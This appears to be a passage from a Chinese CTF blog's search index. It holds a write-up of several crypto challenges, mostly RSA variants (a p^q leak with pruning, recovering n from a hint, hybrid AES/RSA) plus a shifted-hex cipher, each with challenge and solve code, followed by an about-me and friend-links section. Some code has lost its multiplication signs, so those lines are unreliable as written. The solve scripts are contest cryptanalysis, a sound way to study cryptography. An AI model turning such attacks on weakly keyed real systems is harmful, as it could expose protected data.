","date":"2024-12-12","objectID":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/:2:10","tags":["crypto"],"title":"春秋杯冬季赛2024_crypto","uri":"/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024_crypto/"},{"categories":["CTF"],"content":"前言 额，好像是聚餐的时候才知道有这个比赛，打的时候已经要结束了，复现一下 题目 奇奇怪怪的条形码 能隐隐约约看出来里面是字母和数字，一个一个写出来扔到随波逐流里面梭哈就行了。 factor task from Crypto.Util.number import * import gmpy2 import os from enc import flag hint = os.urandom(36) tmp = bytes_to_long(hint) m = bytes_to_long(flag) p = getPrime(512) q = getPrime(512) d = getPrime(400) phi = (p-1)(q-1) e = gmpy2.invert(d,phi) n = pq c = pow(m,e,n) leak1 = p^tmp leak2 = q^tmp print(f\"n = {n}\") print(f\"e = {e}\") print(f\"c = {c}\") print(f\"leak1 = {leak1}\") print(f\"leak2 = {leak2}\") 思路 我们已知leak1=p^temp,leak2=q^temp,那么p^q=leak1^leak2，那么就变成了最经典的剪枝爆破，套用脚本就可以写出来了。貌似这个n可以直接分解，也可以写出来（） exp n= e= c= leak1= leak2= from Crypto.Util.number import* leak=leak1^leak2 leak_bits = 512 xor = bin(leak)[2:].zfill(512) pq = [] def pq_high_xor(p=\"\", q=\"\"): lp, lq = len(p), len(q) tp0 = int(p + (512-lp) * \"0\", 2) tq0 = int(q + (512-lq) * \"0\", 2) tp1 = int(p + (512-lp) * \"1\", 2) tq1 = int(q + (512-lq) * \"1\", 2) if tp0 * tq0 \u003e n or tp1 * tq1 \u003c n: return if lp == leak_bits: pq.append(tp0) return if xor[lp] == \"1\": pq_high_xor(p + \"0\", q + \"1\") pq_high_xor(p + \"1\", q + \"0\") else: pq_high_xor(p + \"0\", q + \"0\") pq_high_xor(p + \"1\", q + \"1\") pq_high_xor() print(pq) p= q= phi=(p-1)*(q-1) d=inverse(e,phi) m=pow(c,d,n) print(long_to_bytes(m)) 给你d又怎样 task from Crypto.Util.number import * from gmpy2 import * flag=“ctfshow{*}” m=bytes_to_long(flag.encode()) e=65537 p=getPrime(128) q=getPrime(128) n=pq phin=(p-1)(q-1) d=invert(e,phin) c=pow(m,e,n) print(“c=\",c) print(“hint=\",pow(n,e,c)) print(“e=\",e) print(“d=\",d) 思路 把n看作a+c,那么ne mod c=ae mod c，这一步就是二项式定理，展开之后后的项一定会有c，那么mod c时就会直接约去，这个时候直接去算a的大小，n就出来了 exp c= hint= e= d= from Crypto.Util.number import * phic=euler_phi(c) dc=inverse_mod(e,phic) a=pow(hint,dc,c) n=int(a)+int(c) m=power_mod(c,d,n) print(long_to_bytes(m)) 简单密码 task 647669776d757e83817372816e707479707c888789757c92788d84838b878d9d 思路 第一眼看上去像是16进制的东西，想着直接转换，没有出来，然后看了看ctfshow这个前缀，发现 ctfshow（hex一下） 63 74 66 73 68 6f 77 64 76 69 77 6d 75 7e 83817372816e707479707c888789757c92788d84838b878d9d 这个规律就出来了 exp a=0x647669776d757e83817372816e707479707c888789757c92788d84838b878d9d from Crypto.Util.number import* cnt=1 for i in long_to_bytes(a): print(chr(i-cnt),end='') cnt=cnt+1 混合密码体系   task from Crypto.Util.number import bytes_to_long,getPrime from Crypto.Cipher import AES from Crypto.Util.Padding import pad # 对称加密 flag = b'ctfshow{***}' # 密文，隐藏 key = b'flag{***}' # 会话密钥，隐藏 iv = b'flag{1fake_flag}' # AES偏移向量，已知 # 对明文进行填充，使其长度符合AES加密的要求 padded_plaintext = pad(flag, AES.block_size) # 创建AES加密对象 cipher = AES.new(key, AES.MODE_CBC, iv) # 加密 ciphertext = cipher.encrypt(padded_plaintext) # 加密后的文本通常是字节串，转成整数便于进行会话密钥的RSA加密 c1 = bytes_to_long(ciphertext) print(f'c1 = {c1}') # 非对称加密 m = bytes_to_long(key) e = 0x10001 p = getPrime(1024) q = getPrime(1024) n = p * q c = pow(m,e,n) print(f'p = {p}') print(f'q = {q}') print(f'n = {n}') print(f'c2 = {c}') # print(\"hint:key需要转成字节流也就是b''\") 思路 字多，但是不难，先把key算出来，iv偏移量已知，那么全都出来了 exp c1= c2= p= q= n= e= from Crypto.Util.number import* phi=(p-1)*(q-1) d=inverse(e,phi) key=pow(c2,d,n) iv = b'flag{1fake_flag}' from Crypto.Cipher import AES cipher = AES.new(long_to_bytes(key), AES.MODE_CBC, iv) plaintext = cipher.decrypt(long_to_bytes(c1)) print(plaintext) ","date":"2024-12-12","objectID":"/%E8%A5%BF%E7%93%9C%E6%9D%AF2024_crypto/:0:0","tags":["crypto"],"title":"西瓜杯2024_crypto","uri":"/%E8%A5%BF%E7%93%9C%E6%9D%AF2024_crypto/"},{"categories":[],"content":"关于我 ","date":"1970-01-01","objectID":"/about/:0:0","tags":[],"title":"关于","uri":"/about/"},{"categories":[],"content":"个人信息 院校: TKKC 战队: Bluebud \u0026 wgpsec 专业: 计算机科学与技术 学习方向: 前后端开发，CTF - crypto / 渗透 / pwn ","date":"1970-01-01","objectID":"/about/:1:0","tags":[],"title":"关于","uri":"/about/"},{"categories":[],"content":"联系方式 QQ: 2924465428 ","date":"1970-01-01","objectID":"/about/:2:0","tags":[],"title":"关于","uri":"/about/"},{"categories":[],"content":"关于博客 此博客于2024年年初搭建，至2025年已换成 Hugo 构建。博客主要用来记录学习笔记以及一些技术分享，希望通过记录自己的学习过程，与大家一起进步。 ","date":"1970-01-01","objectID":"/about/:3:0","tags":[],"title":"关于","uri":"/about/"},{"categories":[],"content":" BornLeader10 一起学习 超越情绪 变得更强 大香蕉 23届web手 Red的小屋 会长web神！ SkyAsh 的小窝 在取证和大数据上奋力攀爬的咸鱼 snoo2y 南信大的网安会长 ztr 的小窝 记录 ztr 的学习与生活。 iyheart 分享学习历程与笔记 3a0-Eminem 一个很强的web师傅 ","date":"1970-01-01","objectID":"/friend/:0:0","tags":[],"title":"友链","uri":"/friend/"}]